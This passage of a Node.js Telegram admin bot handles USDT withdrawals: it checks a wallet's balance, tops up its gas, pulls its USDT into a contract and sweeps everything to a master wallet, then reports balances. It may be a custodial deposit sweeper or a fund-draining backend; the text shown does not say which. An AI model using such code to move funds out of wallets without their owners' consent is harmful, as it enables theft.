            if (withdrawResult.success) {
                const escapedAmount = this.escapeMarkdown(withdrawResult.amount || '0');
                const maskedTxHash = this.maskAddress(withdrawResult.txHash || 'N/A');
                resultsMessage += `✅ ${escapedAmount} USDT withdrawn to master wallet\n`;
                resultsMessage += `Transaction: \`${maskedTxHash}\`\n`;
            } else {
                const escapedError = this.escapeMarkdown(withdrawResult.error || 'No USDT to withdraw');
                resultsMessage += `ℹ️ ${escapedError}\n`;
            }

            resultsMessage += `\n🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC`;

            await this.bot.sendMessage(chatId, resultsMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📊 Check Balances', callback_data: 'balances' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });

        } catch (error) {
            console.error('Error in withdraw all command:', error && error.message ? error.message : error);
            
            const errorMessage = `
❌ *WITHDRAW ALL FAILED*
Error: ${this.escapeMarkdown(error && error.message ? error.message : 'Unknown error')}

🔄 *Last Updated:* ${this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19))} UTC
            `;
            
            await this.bot.sendMessage(chatId, errorMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async promptForSpecificWithdrawal(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        const message = `
🆔 *Specific Wallet Withdrawal*

Please enter the wallet address you want to withdraw from:

📝 Format: 0x followed by 40 hexadecimal characters

Example: 0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF
        `;

        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        // Set a flag to indicate we're waiting for wallet address input
        this.awaitingWalletAddress = chatId;
        
        return await this.bot.sendMessage(chatId, message, options);
    }

    async handleSpecificWithdrawal(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        // Validate wallet address
        if (!walletAddress || !ethers.isAddress(walletAddress)) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address. Please provide a valid Ethereum address.');
        }

        const maskedAddress = this.maskAddress(walletAddress);

        const processingMessage = `
🔄 *Specific Withdrawal Initiated*
Wallet: \`${maskedAddress}\`

Processing\\.\\.\\. This will:
1\\. Check wallet USDT balance
2\\. Pull USDT to contract
3\\. Withdraw all USDT to master wallet
4\\. Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;

        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            await this.bot.sendMessage(chatId, processingMessage, processingOptions);

            // Import services
            let contractService;
            let gasService;
            try {
                contractService = require('../services/contract.service');
                gasService = require('../services/gas.service');
            } catch (e) {
                console.warn('Service not found:', e && e.message ? e.message : e);
            }

            if (!contractService) {
                return await this.bot.sendMessage(chatId, '❌ Contract service not available.');
            }

            // Check wallet balance
            const balance = await contractService.getWalletUSDTBalance(walletAddress);
            const balanceNum = parseFloat(balance);
            
            if (balanceNum <= 10) {
                const lowBalanceMessage = `
❌ *Insufficient Balance*
Wallet: \`${maskedAddress}\`
Balance: *${this.escapeMarkdown(balance)} USDT*

Minimum required: >10 USDT
                `;
                
                return await this.bot.sendMessage(chatId, lowBalanceMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📤 Show Wallets', callback_data: 'pull_list' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            // Check gas balance and send gas if needed
            if (gasService && typeof gasService.checkWalletGasBalance === 'function') {
                const gasCheck = await gasService.checkWalletGasBalance(walletAddress);
                
                if (!gasCheck || !gasCheck.hasSufficientGas) {
                    if (gasService && typeof gasService.sendGasToWallet === 'function') {
                        const gasResult = await gasService.sendGasToWallet(walletAddress);
                        if (!gasResult || !gasResult.success) {
                            const errorMessage = `
❌ *GAS FAILED*
Wallet: \`${maskedAddress}\`
Error: ${this.escapeMarkdown(gasResult && gasResult.error ? gasResult.error : 'Unknown error')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                            `;
                            
                            return await this.bot.sendMessage(chatId, errorMessage, {
                                parse_mode: 'MarkdownV2',
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
                                            { text: '🏠 Main Menu', callback_data: 'menu' }
                                        ]
                                    ]
                                }
                            });
                        }
                    }
                }
            }

            // Pull USDT from wallet
            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
            
            if (!pullResult || !pullResult.success) {
                const pullErrorMessage = `
❌ *PULL FAILED*
Wallet: \`${maskedAddress}\`
Error: ${this.escapeMarkdown(pullResult && pullResult.error ? pullResult.error : 'Unknown error')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
                `;
                
                return await this.bot.sendMessage(chatId, pullErrorMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📤 Show Wallets', callback_data: 'pull_list' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            // Update database
            try {
                const updateQuery = `
                    UPDATE wallets 
                    SET is_processed = true, updated_at = NOW()
                    WHERE address = $1
                `;
                await database.query(updateQuery, [walletAddress]);
            } catch (dbError) {
                console.error('Database update error:', dbError && dbError.message ? dbError.message : dbError);
            }

            // Withdraw all to master wallet
            const withdrawResult = await contractService.withdrawUSDTToMaster();

            // Format success message
            const escapedPullAmount = this.escapeMarkdown(pullResult.amount || '0');
            const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
            const escapedTxHash = this.escapeMarkdown(maskedTxHash);
            
            let successMessage = `
✅ *Specific Withdrawal Successful*
Wallet: \`${maskedAddress}\`
Pulled: *${escapedPullAmount} USDT*
Transaction: \`${escapedTxHash}\`

🏦 *Withdrawal to Master:*
`;

            if (withdrawResult.success) {
                const escapedWithdrawAmount = this.escapeMarkdown(withdrawResult.amount || '0');
                const maskedWithdrawTx = this.maskAddress(withdrawResult.txHash || 'N/A');
                const escapedWithdrawTx = this.escapeMarkdown(maskedWithdrawTx);
                
                successMessage += `✅ ${escapedWithdrawAmount} USDT withdrawn\n`;
                successMessage += `Transaction: \`${escapedWithdrawTx}\`\n`;
            } else {
                const escapedError = this.escapeMarkdown(withdrawResult.error || 'No USDT to withdraw');
                successMessage += `ℹ️ ${escapedError}\n`;
            }

            successMessage += `\n🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC`;

            await this.bot.sendMessage(chatId, successMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📊 Check Balances', callback_data: 'balances' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });

        } catch (error) {
            console.error('Error in specific withdrawal:', error && error.message ? error.message : error);
            
            const errorMessage = `
❌ *SPECIFIC WITHDRAWAL FAILED*
Wallet: \`${maskedAddress}\`
Error: ${this.escapeMarkdown(error && error.message ? error.message : 'Unknown error')}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
            `;
            
            await this.bot.sendMessage(chatId, errorMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async handleBalancesCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }

        const processingMessage = `
📊 *Fetching Real Balances*

📋 *Balance Checks:*
• Smart Contract USDT Balance
• Master Wallet BNB Balance
• Master Wallet USDT Balance

⏳ *Querying blockchain*\\.\\.\\.
        `;

        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };

        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);

            // Fetch real balances with timeout
            const contractBalancePromise = this.getContractUSDTBalance();
            const masterBNBBalancePromise = this.getMasterWalletBNBBalance();
            const masterUSDTBalancePromise = this.getMasterWalletUSDTBalance();

            // Add timeout wrapper
            const timeoutWrapper = (promise, ms) => {
                return Promise.race([
                    promise,
                    new Promise((resolve) => setTimeout(() => resolve({ balance: '0', error: 'Timeout' }), ms))
                ]);
            };

            const contractBalance = await timeoutWrapper(contractBalancePromise, 15000);
            const masterBNBBalance = await timeoutWrapper(masterBNBBalancePromise, 15000);
            const masterUSDTBalance = await timeoutWrapper(masterUSDTBalancePromise, 15000);

            // Format the real balances message

            const contractAddress = process.env.CONTRACT_ADDRESS || 'Not set';
            const maskedContractAddress = this.maskAddress(contractAddress);
            const maskedMasterWallet = this.maskAddress(this.masterWallet);

            // Escape everything that will go into MarkdownV2
            const escapedContractAddress = this.escapeMarkdown(maskedContractAddress);
            const escapedMasterWallet = this.escapeMarkdown(maskedMasterWallet);
            const escapedContractBalance = this.escapeMarkdown(contractBalance && contractBalance.balance ? contractBalance.balance : '0');
            const escapedBNBBalance = this.escapeMarkdown(masterBNBBalance && masterBNBBalance.balance ? masterBNBBalance.balance : '0');
            const escapedUSDTBalance = this.escapeMarkdown(masterUSDTBalance && masterUSDTBalance.balance ? masterUSDTBalance.balance : '0');
            const escapedContractError = contractBalance.error ? this.escapeMarkdown(String(contractBalance.error)) : null;
            const escapedBNBError = masterBNBBalance.error ? this.escapeMarkdown(String(masterBNBBalance.error)) : null;
            const escapedUSDTError = masterUSDTBalance.error ? this.escapeMarkdown(String(masterUSDTBalance.error)) : null;
            const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');

            let balancesMessage = `
📊 *REAL BALANCE REPORT*

`;

            // Contract USDT Balance
            if (process.env.CONTRACT_ADDRESS) {
                balancesMessage += `
💰 *Smart Contract*
• Address: \`${escapedContractAddress}\`
• USDT Balance: *${escapedContractBalance} USDT*
`;
                if (escapedContractError) {
                    balancesMessage += `• ⚠️ Error: ${escapedContractError}\n`;
                }
            } else {
                balancesMessage += `
💰 *Smart Contract*
• Address: Not configured
• USDT Balance: 0\\.00 USDT
`;
            }

            // Master Wallet Balances
            balancesMessage += `
🏦 *Master Wallet*
• Address: \`${escapedMasterWallet}\`
• BNB Balance: *${escapedBNBBalance} BNB*
• USDT Balance: *${escapedUSDTBalance} USDT*
`;

            if (escapedBNBError) {
                balancesMessage += `• ⚠️ BNB Error: ${escapedBNBError}\n`;
            }
            if (escapedUSDTError) {
                balancesMessage += `• ⚠️ USDT Error: ${escapedUSDTError}\n`;
            }

            balancesMessage += `
🔄 *Last Updated:* ${escapedTimestamp}
`;

            await this.bot.sendMessage(chatId, balancesMessage, {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Show Wallets', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🔄 Refresh Balances', callback_data: 'balances' },
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });

            return result;
        } catch (error) {
            console.error('Error in balances command:', error && error.message ? error.message : error);

            // Create a clean error message without special characters
            const cleanErrorMessage = error && error.message
                ? error.message.replace(/[^a-zA-Z0-9\s\.\,\!\?\-]/g, '').substring(0, 200)
                : 'Unknown error occurred';

            const errorMessage = `
❌ *BALANCES FAILED*
Error: ${this.escapeMarkdown(cleanErrorMessage)}

🔄 *Last Updated:* ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
    `;

            // Send with fallback to plain text if markdown fails
            try {
                await this.bot.sendMessage(chatId, errorMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            } catch (markdownError) {
                // Fallback without markdown
                const fallbackMessage = `
❌ BALANCES FAILED
Error: ${cleanErrorMessage}

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
        `;
                await this.bot.sendMessage(chatId, fallbackMessage, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }

            return this.bot.sendMessage(chatId, `❌ Error: ${cleanErrorMessage}`);
        }
    }

    // Process webhook updates manually and handle text messages for wallet address input
    async processUpdate(update) {
        if (this.bot) {
            try {
                // Handle text messages for wallet address input
                if (update.message && update.message.text && this.awaitingWalletAddress) {
                    const chatId = update.message.chat.id;
                    if (chatId === this.awaitingWalletAddress) {
                        const walletAddress = update.message.text.trim();
                        delete this.awaitingWalletAddress; // Clear the flag
                        await this.handleSpecificWithdrawal(chatId, walletAddress);
                        return;
                    }
                }
                
                // Process regular updates
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error && error.message ? error.message : error);
            }
        }
    }
}

module.exports = new TelegramService();
